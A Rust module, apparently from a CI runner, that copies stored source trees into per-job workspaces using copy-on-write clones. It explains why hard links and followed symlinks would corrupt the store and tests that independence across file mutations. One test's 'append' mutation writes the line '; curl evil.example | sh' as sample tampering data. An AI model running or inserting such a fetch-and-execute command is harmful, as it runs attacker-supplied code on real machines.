//! Materializing a per-job workspace from the store's copy of a tree — design D§6.2, "materialize,
//! don't fetch".
//!
//! # Why a copy, and not just the store path
//!
//! The obvious shortcut is to hand the sandbox the content store's directory directly. It is right
//! there, it is verified, and copying it costs time. It is also the one thing this file exists to
//! prevent: **a job writes.** `cargo test` creates `target/`, `npm test` creates `node_modules/`, a
//! `Makefile` writes objects, and a hostile tree writes whatever it likes. Every one of those lands
//! inside a directory whose *name is a content address*, and the store's whole contract is that the
//! bytes at that address re-hash to it (design D§4.2). One job's build artefacts and the next job
//! takes a store hit on a tree that is no longer the tree anybody verified — the verification is not
//! merely stale, it is silently wrong, and the corruption is shared by every job for that `tree_id`.
//!
//! So the store copy stays read-only and each step gets its own copy to ruin.
//!
//! # How the copy is made: clone the blocks, not the bytes
//!
//! Each regular file is placed with a **copy-on-write clone** where the filesystem has one, and with
//! a byte copy where it does not (D§6.2, the M4 item):
//!
//! | platform / filesystem | mechanism |
//! |---|---|
//! | macOS, APFS | `clonefile(2)` |
//! | Linux, btrfs / XFS | the `FICLONE` ioctl (reflink) |
//! | anything else, or a failure | `fs::copy` |
//!
//! Both syscalls are reached through the `reflink-copy` crate rather than raw `libc`, so this crate
//! writes no `unsafe` for a problem two well-worn ioctls already solve.
//!
//! A clone gives a **new inode that shares the old one's data blocks**, marked so that the first
//! write to either side allocates fresh blocks for that side alone. The copy is therefore O(metadata)
//! rather than O(bytes) — a hundred-megabyte checkout costs a syscall per file — while the workspace
//! stays a thing the job may ruin.
//!
//! ## Why this is a clone and emphatically not a hard link
//!
//! A `hard_link` would also be one cheap syscall, would also leave the right bytes at the right path,
//! and would pass any test that only reads the workspace back. It would also be a **second name for
//! the store's inode**: the job's first `>` , `chmod +x`, `truncate` or `mv` over that path edits the
//! store's file in place, and the tree at its content address stops hashing to its content — for
//! every later job and every later verification, silently. That is the exact corruption the whole
//! module exists to prevent, arrived at from the other direction.
//!
//! The distinction is structural, not a matter of care: a clone's destination has `st_nlink == 1` and
//! an inode number of its own, so nothing done through it can be reachable from the store. The tests
//! below assert on that structure and on independence under each mutation a job can actually perform,
//! rather than on the workspace merely having the right contents — a contents-only assertion is
//! satisfied by the dangerous implementation and is worse than no test at all.
//!
//! ## When the filesystem cannot clone
//!
//! Cloning is best-effort by construction, and every failure falls back to `fs::copy`:
//!
//! * **The filesystem has no reflink** — ext4, HFS+, tmpfs, most network filesystems. `EOPNOTSUPP`.
//! * **Source and destination are on different filesystems.** `EXDEV`. This is a *configured*
//!   arrangement, not an exotic one: `HULL_CI_STORE_ROOT` and `HULL_CI_WORK_ROOT` are separate
//!   settings (see [`crate::config`]) and an operator who puts the cache on bulk storage and
//!   workspaces on a fast local disk has done something sensible. It must cost throughput, never a
//!   job.
//! * **Anything else** — a quota, a filesystem that reports support and then refuses a particular
//!   file. A clone is an optimization; there is no failure of one that is worth turning into an
//!   `errored` verdict when a byte copy is right there.
//!
//! The fallback is written here rather than taken from `reflink_copy::reflink_or_copy`, because that
//! combinator re-raises `NotFound`/`PermissionDenied`/`AlreadyExists` instead of copying and discards
//! the reason it fell back. Both matter: a clone failure must never be fatal while a copy could still
//! work, and [`MaterializeReport::fallback_reason`] is what tells an operator staring at a slow
//! runner *which* of the cases above they are in.
//!
//! ## Which path ran is a returned fact, not an inference
//!
//! [`materialize`] returns a [`MaterializeReport`] counting cloned versus copied files. That exists
//! for the tests as much as for the logs: a fallback this total is a trap for testing, because on a
//! filesystem without reflink every file quietly takes the copy path and a test suite that only
//! checks contents passes without ever executing the clone code. The report makes the choice an
//! assertable fact, so [`tests::the_clone_path_is_the_one_that_runs_where_cloning_works`] can compare
//! it against an *independent* probe of the filesystem's capability and fail if the clone path
//! silently stops being taken. Nothing here is measured in wall-clock time.
//!
//! # What the copy does and does not follow
//!
//! Symlinks are recreated **as symlinks**, never followed. Following them would let a link inside the
//! tree pull host content into the workspace under a name the tree chose, which is a file-disclosure
//! primitive on the local backend and a way to smuggle bytes past the content address on any backend.
//! The extractor already refuses absolute targets and targets that escape the tree root
//! (`hull-ci-fetch`'s `Rejection::AbsoluteSymlinkTarget` / `SymlinkEscapesRoot`), so a link we copy
//! verbatim resolves inside the workspace — but this side does not *rely* on that, because "somebody
//! else validated it" is how the second copy of a rule stops being true.
//!
//! Cloning sharpens the point rather than softening it. `clonefile(2)` follows symlinks unless
//! `CLONE_NOFOLLOW` is passed, and `reflink-copy` does not pass it; `clonefile(2)` on a *directory*
//! clones the whole hierarchy underneath. So a clone is only ever attempted on a path that
//! `symlink_metadata` has already said is a regular file, and the tree is walked entry by entry
//! instead of handed to one recursive `clonefile` call. The whole-tree call would be faster and would
//! bypass both the symlink rule and the device-node refusal below — the speed is not worth reopening
//! either.

use std::fs;
use std::io;
use std::path::Path;

/// Which mechanism placed each file, so callers and tests can tell without guessing.
///
/// Counted rather than per-path: the interesting question is "did the clone path run at all", and a
/// per-file list of a hundred-thousand-file checkout is a log line nobody reads.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct MaterializeReport {
    /// Regular files placed by a CoW clone — `clonefile(2)` or `FICLONE`.
    pub cloned: usize,
    /// Regular files placed by a byte copy, because cloning was unavailable or failed.
    pub copied: usize,
    /// Symlinks recreated as symlinks. Never cloned, never followed — see the module docs.
    pub symlinks: usize,
    /// Directories created (excluding the workspace root itself).
    pub directories: usize,
    /// Why the first fallback happened, if any. The first rather than the last, and only one:
    /// on a filesystem that cannot clone, every file fails identically and the second through
    /// hundred-thousandth copies of `EOPNOTSUPP` say nothing the first did not.
    pub fallback_reason: Option<String>,
}

/// Copy `tree` to `dest`, which must not already exist.
///
/// Synchronous by nature (it is filesystem work) — callers run it on a blocking worker.
pub fn materialize(tree: &Path, dest: &Path) -> io::Result<MaterializeReport> {
    materialize_with(tree, dest, true)
}

/// [`materialize`], with the clone attempt switchable off.
///
/// The switch exists so the fallback is *tested* rather than merely present. Every machine this is
/// developed on has APFS and every machine it is developed on therefore never executes `fs::copy`
/// here — which would leave the path that runs on an operator's ext4 or across their two configured
/// roots covered by nothing at all. Passing `false` runs the same independence, mode and symlink
/// assertions over the copy path on any filesystem. It is not wired to configuration: there is no
/// deployment that wants cloning off, only deployments that cannot have it.
fn materialize_with(tree: &Path, dest: &Path, clone_when_supported: bool) -> io::Result<MaterializeReport> {
    if dest.exists() {
        // A workspace path is per (job, step) and single-use, exactly like the sandbox that mounts
        // it (§14.1). Reusing one would carry the previous attempt's leftovers into this one.
        return Err(io::Error::new(
            io::ErrorKind::AlreadyExists,
            format!("workspace `{}` already exists", dest.display()),
        ));
    }
    if let Some(parent) = dest.parent() {
        fs::create_dir_all(parent)?;
    }
    fs::create_dir(dest)?;
    let mut report = MaterializeReport::default();
    copy_dir(tree, dest, clone_when_supported, &mut report)?;
    Ok(report)
}

/// Remove a workspace, best effort.
///
/// Best effort because it runs on teardown paths that must not fail a verdict that is already
/// decided: a workspace we could not delete is a disk-space problem for the operator, not a reason to
/// tell Hull we could not test the code.
pub fn discard(dest: &Path) {
    if let Err(e) = fs::remove_dir_all(dest) {
        if e.kind() != io::ErrorKind::NotFound {
            tracing::warn!(path = %dest.display(), error = %e, "could not remove job workspace");
        }
    }
}

/// Iterative rather than recursive: depth is bounded by the extractor (`max_path_depth`), but a
/// stack-recursive copy makes that bound load-bearing for *our* stack, and a tree is untrusted input.
fn copy_dir(
    from: &Path,
    to: &Path,
    clone_when_supported: bool,
    report: &mut MaterializeReport,
) -> io::Result<()> {
    let mut pending = vec![(from.to_path_buf(), to.to_path_buf())];

    while let Some((src_dir, dst_dir)) = pending.pop() {
        for entry in fs::read_dir(&src_dir)? {
            let entry = entry?;
            let src = entry.path();
            let dst = dst_dir.join(entry.file_name());
            // `symlink_metadata`, so a symlink is examined rather than resolved. This is also what
            // keeps a symlink out of the clone call: `clonefile(2)` follows links unless
            // `CLONE_NOFOLLOW` is set, and it clones a directory hierarchy wholesale, so the branch
            // order below — directory, then symlink, then regular file — is the guard, not a style.
            let meta = fs::symlink_metadata(&src)?;

            if meta.is_dir() {
                fs::create_dir(&dst)?;
                copy_permissions(&meta, &dst)?;
                report.directories += 1;
                pending.push((src, dst));
            } else if meta.is_symlink() {
                copy_symlink(&src, &dst)?;
                report.symlinks += 1;
            } else if meta.is_file() {
                place_file(&src, &dst, &meta, clone_when_supported, report)?;
            } else {
                // The extractor refuses device nodes, fifos and sockets, so one here means something
                // wrote into the store behind us. Refuse rather than skip: a workspace that silently
                // differs from the tree is the failure mode the content address exists to rule out.
                return Err(io::Error::new(
                    io::ErrorKind::InvalidData,
                    format!("unexpected file type in the stored tree at `{}`", src.display()),
                ));
            }
        }
    }
    Ok(())
}

/// Place one regular file: clone it if we can, copy it if we cannot, and say which.
///
/// `src` has already been established to be a regular file by the caller's `symlink_metadata` — see
/// the module docs for why handing anything else to the clone is not an option.
fn place_file(
    src: &Path,
    dst: &Path,
    meta: &fs::Metadata,
    clone_when_supported: bool,
    report: &mut MaterializeReport,
) -> io::Result<()> {
    if clone_when_supported {
        match reflink_copy::reflink(src, dst) {
            Ok(()) => {
                report.cloned += 1;
                return copy_permissions(meta, dst);
            }
            Err(e) => {
                if report.fallback_reason.is_none() {
                    report.fallback_reason = Some(e.to_string());
                }
                // Both backends create the destination with `O_EXCL` semantics and unlink it when
                // the clone fails, so there should be nothing here. Removed anyway, because if that
                // ever stopped being true the `fs::copy` below would fail with `AlreadyExists` and
                // turn a filesystem that merely cannot clone into a filesystem that cannot run jobs.
                let _ = fs::remove_file(dst);
            }
        }
    }
    fs::copy(src, dst)?;
    report.copied += 1;
    copy_permissions(meta, dst)
}

/// Stamp the source's mode onto the destination, on both the clone and the copy path.
///
/// The **executable bit is part of the tree's content address** (keel's `MODE_FILE` vs `0o755`), so a
/// workspace whose scripts lost `+x` is not the tree that was verified, and the step fails in a way
/// that reads as the author's bug rather than as ours.
///
/// Stated honestly: on APFS this line changes nothing, because `clonefile(2)` copies the mode itself,
/// and deleting it does not fail a test on a Mac. It is written anyway because the *three* mechanisms
/// preserve the mode for three different reasons — `fs::copy` by contract, `FICLONE` only because
/// `reflink-copy` chmods afterwards as an implementation detail we do not control, `clonefile(2)` by
/// the kernel — and one explicit line is one behaviour to keep true instead of three to keep in sync
/// across a dependency bump. The cost is a `chmod(2)` per file; the alternative is discovering on
/// somebody's btrfs that the exec bit is a transitive dependency's promise.
///
/// Ownership is deliberately *not* propagated (`clonefile(2)` is invoked with `CLONE_NOOWNERCOPY`, so
/// clones land owned by this process either way): everything here is owned by the runner, so a setuid
/// bit that survives the mode copy confers the runner's own privileges inside a sandbox and grants
/// nothing. It is preserved because the alternative is quietly altering a verified tree.
#[cfg(unix)]
fn copy_permissions(meta: &fs::Metadata, dst: &Path) -> io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    fs::set_permissions(dst, fs::Permissions::from_mode(meta.permissions().mode()))
}

#[cfg(not(unix))]
fn copy_permissions(_meta: &fs::Metadata, _dst: &Path) -> io::Result<()> {
    Ok(())
}

#[cfg(unix)]
fn copy_symlink(src: &Path, dst: &Path) -> io::Result<()> {
    let target = fs::read_link(src)?;
    std::os::unix::fs::symlink(target, dst)
}

#[cfg(not(unix))]
fn copy_symlink(src: &Path, _dst: &Path) -> io::Result<()> {
    Err(io::Error::new(
        io::ErrorKind::Unsupported,
        format!("cannot reproduce the symlink `{}` on this platform", src.display()),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Read as arguments to [`materialize_with`]: every property below is asserted over both
    /// mechanisms, because the copy path is the one that runs on an operator's ext4 and is the one a
    /// developer's APFS machine would otherwise never execute.
    const CLONE: bool = true;
    const COPY: bool = false;

    #[test]
    fn the_workspace_is_a_copy_the_job_can_ruin() {
        let store = tempfile::tempdir().unwrap();
        fs::write(store.path().join("Makefile"), "test:\n\ttrue\n").unwrap();
        fs::create_dir(store.path().join("src")).unwrap();
        fs::write(store.path().join("src/main.rs"), "fn main() {}\n").unwrap();

        let work = tempfile::tempdir().unwrap();
        let ws = work.path().join("job/step");
        let report = materialize(store.path(), &ws).unwrap();
        assert_eq!(fs::read_to_string(ws.join("src/main.rs")).unwrap(), "fn main() {}\n");
        assert_eq!(report.cloned + report.copied, 2, "both regular files are accounted for");
        assert_eq!(report.directories, 1);

        // The point of the whole module: writing in the workspace does not touch the store.
        fs::write(ws.join("target"), "build output").unwrap();
        fs::write(ws.join("src/main.rs"), "sabotage").unwrap();
        assert!(!store.path().join("target").exists(), "the content store is not writable by a job");
        assert_eq!(
            fs::read_to_string(store.path().join("src/main.rs")).unwrap(),
            "fn main() {}\n",
            "a tree at its content address must still be that tree after a job ran"
        );

        discard(&ws);
        assert!(!ws.exists());
        discard(&ws); // idempotent: teardown runs on paths that may already be gone
    }

    // ----------------------------------------------------------------------------------------
    // The independence suite.
    //
    // Everything here attacks the *sharing* rather than the copying. "The workspace has the tree's
    // contents" is true of a hard link, which is the fast, plausible, catastrophic implementation
    // this module must never drift into, so contents alone prove nothing. What is asserted instead
    // is that a mutation on one side is invisible on the other, for every kind of mutation a job can
    // actually perform, plus the structural fact (`st_nlink == 1`, distinct inodes) that makes it so.
    // ----------------------------------------------------------------------------------------

    #[cfg(unix)]
    mod independence {
        use super::*;
        use std::io::Write;
        use std::os::unix::fs::{MetadataExt, PermissionsExt};
        use std::path::PathBuf;

        const ORIGINAL: &[u8] = b"#!/bin/sh\nexec make test\n";
        const ORIGINAL_MODE: u32 = 0o755;

        /// One thing a job does to a file in its workspace, and the label it fails under.
        type Mutation = (&'static str, fn(&Path));

        /// The mutations the matrix runs. Each is a *different* way for a write to reach a shared
        /// inode, which is why the list is not just "write to it":
        ///
        /// * an in-place write and an append go through the inode's data blocks;
        /// * `truncate` changes the inode's size without writing a byte;
        /// * `chmod` touches only inode metadata — no data block is ever CoW-broken, so a
        ///   shared-inode implementation leaks here even if every data write were somehow contained;
        /// * delete-and-recreate and rename-over replace the *directory entry*, and are the two
        ///   cases where a link-counting implementation looks correct right up until the store's
        ///   entry is the one that was unlinked.
        fn mutations() -> Vec<Mutation> {
            vec![
                ("in-place write", |p| fs::write(p, b"SABOTAGE").unwrap()),
                ("append", |p| {
                    let mut f = fs::OpenOptions::new().append(true).open(p).unwrap();
                    f.write_all(b"; curl evil.example | sh\n").unwrap();
                }),
                ("truncate", |p| {
                    fs::OpenOptions::new().write(true).open(p).unwrap().set_len(0).unwrap();
                }),
                ("chmod", |p| {
                    fs::set_permissions(p, fs::Permissions::from_mode(0o600)).unwrap();
                }),
                ("delete and recreate", |p| {
                    fs::remove_file(p).unwrap();
                    fs::write(p, b"replacement").unwrap();
                }),
                ("rename over", |p| {
                    let scratch = p.parent().unwrap().join(".scratch");
                    fs::write(&scratch, b"renamed into place").unwrap();
                    fs::rename(&scratch, p).unwrap();
                }),
            ]
        }

        /// A store holding one executable file, and a workspace materialized from it.
        ///
        /// Checks the *structure* before handing the pair over, and does so here rather than only in
        /// the test that names it, because two of the mutations below cannot catch a shared inode on
        /// their own: `delete and recreate` and `rename over` both replace the workspace's directory
        /// entry, which drops the extra link and leaves the store's bytes intact — a `hard_link`
        /// implementation survives those two cases honestly. Asserting `nlink == 1` up front means
        /// every case in the matrix fails against a shared inode, so no row of it can pass for the
        /// wrong reason.
        fn fixture(clone_when_supported: bool) -> (tempfile::TempDir, tempfile::TempDir, PathBuf, PathBuf) {
            let store = tempfile::tempdir().unwrap();
            let src = store.path().join("run.sh");
            fs::write(&src, ORIGINAL).unwrap();
            fs::set_permissions(&src, fs::Permissions::from_mode(ORIGINAL_MODE)).unwrap();

            let work = tempfile::tempdir().unwrap();
            let ws = work.path().join("ws");
            materialize_with(store.path(), &ws, clone_when_supported).unwrap();
            let dst = ws.join("run.sh");

            let (a, b) = (fs::metadata(&src).unwrap(), fs::metadata(&dst).unwrap());
            assert_eq!(a.nlink(), 1, "the store file gained a second name");
            assert_eq!(b.nlink(), 1, "the workspace file is a second name for something");
            assert!((a.ino(), a.dev()) != (b.ino(), b.dev()), "the two paths are one file");

            (store, work, src, dst)
        }

        /// The file is byte-for-byte and mode-for-mode what it started as, and is nobody else's
        /// inode.
        fn assert_pristine(p: &Path, side: &str, case: &str) {
            let meta = fs::symlink_metadata(p)
                .unwrap_or_else(|e| panic!("[{case}] the {side} file vanished: {e}"));
            assert!(meta.is_file(), "[{case}] the {side} file is still a regular file");
            assert_eq!(
                fs::read(p).unwrap(),
                ORIGINAL,
                "[{case}] the {side} bytes must still hash to the address they are filed under"
            );
            assert_eq!(
                meta.permissions().mode() & 0o7777,
                ORIGINAL_MODE,
                "[{case}] the {side} mode changed; keel addresses the exec bit"
            );
            assert_eq!(
                meta.nlink(),
                1,
                "[{case}] the {side} file has a second name — a hard link, not a clone"
            );
        }

        #[test]
        fn nothing_a_job_does_to_its_workspace_reaches_the_store() {
            for &mechanism in &[CLONE, COPY] {
                for (case, mutate) in mutations() {
                    let (_store, _work, src, dst) = fixture(mechanism);
                    let label = format!("{case}/{}", if mechanism { "clone" } else { "copy" });
                    mutate(&dst);
                    assert_pristine(&src, "store", &label);
                }
            }
        }

        #[test]
        fn nothing_done_to_the_store_reaches_a_live_workspace() {
            // The other direction. The store is supposed to be immutable, so this is not a scenario
            // we expect — it is how we detect that the two paths are one inode. If they were, GC
            // touching a store file, or a second job's leaked write, would rewrite a workspace out
            // from under a step that is already running and the step would fail unexplainably.
            for &mechanism in &[CLONE, COPY] {
                for (case, mutate) in mutations() {
                    let (_store, _work, src, dst) = fixture(mechanism);
                    let label = format!("{case}/{}", if mechanism { "clone" } else { "copy" });
                    mutate(&src);
                    assert_pristine(&dst, "workspace", &label);
                }
            }
        }

        #[test]
        fn the_workspace_file_is_a_new_inode_not_a_second_name_for_the_stores() {
            // The structural claim, named. [`fixture`] enforces it for every row of the matrix
            // above; this test exists so the property has somewhere to be stated rather than only
            // being a precondition of other tests — and so a failure reads as "the workspace shares
            // the store's inode" instead of "the append case broke".
            for &mechanism in &[CLONE, COPY] {
                let (_store, _work, src, dst) = fixture(mechanism);
                assert_ne!(fs::canonicalize(&src).unwrap(), fs::canonicalize(&dst).unwrap());
            }
        }

        #[test]
        fn the_executable_bit_survives_because_it_is_part_of_the_address() {
            for &mechanism in &[CLONE, COPY] {
                let (_store, _work, _src, dst) = fixture(mechanism);
                let mode = fs::metadata(&dst).unwrap().permissions().mode();
                assert_eq!(mode & 0o111, 0o111, "keel addresses the exec bit; the workspace keeps it");
                assert_eq!(mode & 0o7777, ORIGINAL_MODE, "and the rest of the mode with it");
            }
        }

        #[test]
        fn a_symlink_is_copied_as_a_link_never_followed() {
            // Not merely "still a symlink": also that it did not go through the clone. `clonefile(2)`
            // resolves a symlink unless `CLONE_NOFOLLOW` is passed and `reflink-copy` does not pass
            // it, so routing a link through the clone path would materialize the *target's* bytes
            // under the link's name — the file-disclosure primitive the module docs describe, handed
            // to the tree's author.
            for &mechanism in &[CLONE, COPY] {
                let store = tempfile::tempdir().unwrap();
                fs::write(store.path().join("real.txt"), "payload\n").unwrap();
                std::os::unix::fs::symlink("real.txt", store.path().join("link.txt")).unwrap();

                let work = tempfile::tempdir().unwrap();
                let ws = work.path().join("ws");
                let report = materialize_with(store.path(), &ws, mechanism).unwrap();

                let meta = fs::symlink_metadata(ws.join("link.txt")).unwrap();
                assert!(meta.is_symlink(), "following it would let the tree name host content");
                assert_eq!(fs::read_link(ws.join("link.txt")).unwrap(), PathBuf::from("real.txt"));
                assert_eq!(report.symlinks, 1);
                assert_eq!(
                    report.cloned + report.copied,
                    1,
                    "only `real.txt` is placed as a file; the link is never handed to clonefile"
                );
            }
        }
    }

    #[test]
    fn a_workspace_is_never_reused() {
        let store = tempfile::tempdir().unwrap();
        fs::write(store.path().join("a"), "x").unwrap();
        let work = tempfile::tempdir().unwrap();
        let ws = work.path().join("ws");

        materialize(store.path(), &ws).unwrap();
        let err = materialize(store.path(), &ws).expect_err("§14.1: single use, workspace included");
        assert_eq!(err.kind(), io::ErrorKind::AlreadyExists);
    }

    #[test]
    fn turning_cloning_off_takes_the_copy_path_and_says_so() {
        // The report has to be honest in the direction that is easy to get right, or the tests that
        // depend on it in the direction that is easy to get wrong prove nothing.
        let store = tempfile::tempdir().unwrap();
        fs::write(store.path().join("a"), "x").unwrap();
        fs::write(store.path().join("b"), "y").unwrap();
        let work = tempfile::tempdir().unwrap();

        let report = materialize_with(store.path(), &work.path().join("ws"), COPY).unwrap();
        assert_eq!((report.cloned, report.copied), (0, 2));
        assert_eq!(report.fallback_reason, None, "nothing failed; cloning was simply not attempted");
    }

    // ----------------------------------------------------------------------------------------
    // Did the clone path actually run?
    //
    // This is the question the fallback makes easy to fake. `materialize` cannot answer it about
    // itself — if the clone call were removed, deleted or silently broken, every file would take the
    // copy path and every assertion above would still hold. So the filesystem's capability is
    // established by an *independent* implementation (the system `cp`, which has its own binding to
    // `clonefile(2)` / `FICLONE`) and the report is required to agree with it.
    // ----------------------------------------------------------------------------------------

    /// Ask the system `cp` to clone, and nothing else, from `src_dir` into `dst_dir`.
    ///
    /// `cp -c` (macOS) and `cp --reflink=always` (Linux) both fail rather than fall back, which is
    /// what makes them an oracle: a success means this pair of directories genuinely supports block
    /// cloning, and it was established without executing a line of this module.
    #[cfg(unix)]
    fn the_system_can_clone_between(src_dir: &Path, dst_dir: &Path) -> bool {
        let src = src_dir.join(".clone-probe");
        let dst = dst_dir.join(".clone-probe");
        fs::write(&src, b"probe").unwrap();
        let _ = fs::remove_file(&dst);

        let flag = if cfg!(target_os = "macos") { "-c" } else { "--reflink=always" };
        let cp = ["/bin/cp", "/usr/bin/cp"]
            .into_iter()
            .find(|p| Path::new(p).exists())
            .expect("a POSIX system has a `cp`; without one the oracle cannot be trusted");

        let out = std::process::Command::new(cp)
            .arg(flag)
            .arg(&src)
            .arg(&dst)
            .output()
            .expect("running the system `cp`");
        let supported = out.status.success();
        let _ = fs::remove_file(&src);
        let _ = fs::remove_file(&dst);
        supported
    }

    #[cfg(unix)]
    #[test]
    fn the_clone_path_is_the_one_that_runs_where_cloning_works() {
        let store = tempfile::tempdir().unwrap();
        for name in ["a", "b", "c"] {
            fs::write(store.path().join(name), name).unwrap();
        }
        let work = tempfile::tempdir().unwrap();
        let ws = work.path().join("ws");

        // Probe between the very directories `materialize` will use, so the answer is about this
        // filesystem pair and not about filesystems in general.
        let supported = the_system_can_clone_between(store.path(), work.path());
        let report = materialize(store.path(), &ws).unwrap();

        if supported {
            assert_eq!(
                (report.cloned, report.copied),
                (3, 0),
                "the system `cp` cloned between these directories, so we must have too — a report \
                 of copies here means the CoW path has silently stopped running ({:?})",
                report.fallback_reason
            );
        } else {
            assert_eq!(
                (report.cloned, report.copied),
                (0, 3),
                "this filesystem cannot clone, so every file must have taken the byte copy"
            );
            assert!(
                report.fallback_reason.is_some(),
                "a fallback that cannot say why it happened leaves the operator guessing"
            );
        }
    }

    // ----------------------------------------------------------------------------------------
    // Cross-device: the store root and the work root are separate settings, so they can be separate
    // filesystems, and `clonefile(2)`/`FICLONE` both refuse across one. Proved against a real second
    // filesystem — a RAM disk, which needs no privileges on macOS — rather than by reasoning about
    // `EXDEV`, because "the fallback triggers on the errors I thought of" is the assumption at issue.
    // ----------------------------------------------------------------------------------------

    /// A private filesystem, attached for one test and detached when the guard drops.
    #[cfg(target_os = "macos")]
    struct RamDisk {
        device: String,
        mount: std::path::PathBuf,
    }

    #[cfg(target_os = "macos")]
    impl RamDisk {
        /// 16 MiB — enough for a handful of test files, small enough that erasing it is a couple of
        /// seconds. `hdiutil` and `diskutil` are both part of macOS and neither needs `sudo` for a
        /// RAM-backed device, so this runs in the ordinary suite instead of behind `--ignored`.
        fn attach() -> RamDisk {
            let out = std::process::Command::new("/usr/bin/hdiutil")
                .args(["attach", "-nomount", "ram://32768"])
                .output()
                .expect("hdiutil is part of macOS");
            assert!(out.status.success(), "could not attach a RAM disk: {out:?}");
            let device = String::from_utf8_lossy(&out.stdout).trim().to_string();
            assert!(device.starts_with("/dev/"), "hdiutil named no device: {device:?}");

            // Unique, so two runs of the suite cannot collide on `/Volumes/<name>`.
            let name = format!(
                "hullci{}{}",
                std::process::id(),
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .subsec_nanos()
            );
            let disk = RamDisk { device, mount: Path::new("/Volumes").join(&name) };

            let erase = std::process::Command::new("/usr/sbin/diskutil")
                .args(["eraseVolume", "APFS", &name, &disk.device])
                .output()
                .expect("diskutil is part of macOS");
            assert!(erase.status.success(), "could not format the RAM disk: {erase:?}");
            assert!(disk.mount.is_dir(), "diskutil did not mount at {}", disk.mount.display());
            disk
        }
    }

    #[cfg(target_os = "macos")]
    impl Drop for RamDisk {
        fn drop(&mut self) {
            let _ = std::process::Command::new("/usr/bin/hdiutil")
                .args(["detach", &self.device, "-force"])
                .output();
        }
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn a_store_on_another_filesystem_falls_back_instead_of_failing_the_job() {
        use std::os::unix::fs::PermissionsExt;

        let disk = RamDisk::attach();
        let store = disk.mount.join("tree");
        fs::create_dir(&store).unwrap();
        fs::write(store.join("Makefile"), "test:\n\ttrue\n").unwrap();
        let script = store.join("run.sh");
        fs::write(&script, "#!/bin/sh\ntrue\n").unwrap();
        fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).unwrap();

        // The workspace stays on the ordinary temp filesystem: this is the operator who put
        // HULL_CI_STORE_ROOT and HULL_CI_WORK_ROOT on different disks.
        let work = tempfile::tempdir().unwrap();
        let ws = work.path().join("ws");

        assert!(
            !the_system_can_clone_between(&store, work.path()),
            "the RAM disk and the temp directory must be different filesystems for this to test \
             anything; the system `cp` says they are not"
        );

        let report = materialize(&store, &ws).unwrap();
        assert_eq!(
            (report.cloned, report.copied),
            (0, 2),
            "EXDEV must cost throughput, not the job"
        );
        assert!(report.fallback_reason.is_some(), "the operator is told why it was slow");

        // And the fallback is a real materialization, not a degraded one.
        assert_eq!(fs::read_to_string(ws.join("Makefile")).unwrap(), "test:\n\ttrue\n");
        assert_eq!(
            fs::metadata(ws.join("run.sh")).unwrap().permissions().mode() & 0o111,
            0o111,
            "the exec bit is addressed content; a cross-device copy does not get to drop it"
        );
        fs::write(ws.join("run.sh"), "SABOTAGE").unwrap();
        assert_eq!(
            fs::read_to_string(&script).unwrap(),
            "#!/bin/sh\ntrue\n",
            "independence is a property of the copy too, not only of the clone"
        );
    }
}
